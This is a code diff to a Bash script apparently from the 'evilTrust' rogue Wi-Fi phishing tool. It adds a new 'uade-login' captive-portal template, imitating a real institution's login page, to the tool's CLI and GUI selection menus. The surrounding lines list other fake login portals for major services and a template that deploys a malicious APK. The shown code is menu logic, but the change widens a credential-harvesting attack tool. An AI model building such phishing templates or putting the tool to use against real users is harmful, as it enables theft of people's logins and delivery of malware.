@@ -145,10 +145,10 @@ function startAttack(){
 	sleep 5
 
 	# Array de plantillas
-	plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
+	plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one uade-login)
 
 	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
-	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template
+	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi, uade-login):${endColour} " && read template
 
 	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
 		if [ "$plantilla" == "$template" ]; then
@@ -304,11 +304,11 @@ function guiMode(){
         sleep 5
 
         # Array de plantillas
-        plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
+        plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one uade-login)
 
 	whiptail --title "evilTrust - by S4vitar" --msgbox "¡Listo!, hora de escoger tu plantilla" 8 78
 
-        whiptail --title "evilTrust - by S4vitar" --checklist --separate-output "Selecciona la plantilla que desees utilizar" 20 103 12 \
+        whiptail --title "evilTrust - by S4vitar" --checklist --separate-output "Selecciona la plantilla que desees utilizar" 20 103 13 \
         facebook-login "Plantilla de inicio de sesión de Facebook" OFF \
         google-login "Plantilla de inicio de sesión de Google" OFF \
         starbucks-login "Plantilla de inicio de sesión de Starbucks" OFF \
@@ -317,6 +317,7 @@ function guiMode(){
         all_in_one "Plantilla todo en uno (múltiples portales centralizados)" OFF \
         cliqq-payload "Plantilla con despliege de APK malicioso" OFF \
         optimumwifi "Plantilla de inicio de sesión para el uso de WiFi (Selección de ISP)" OFF \
+				uade-login "Plantilla de inicio de sesión de UADE" OFF \
 	personalizada "Uso de plantilla personalizada" OFF 2>template
 
 	template=$(cat template | tr -d '"'); rm template
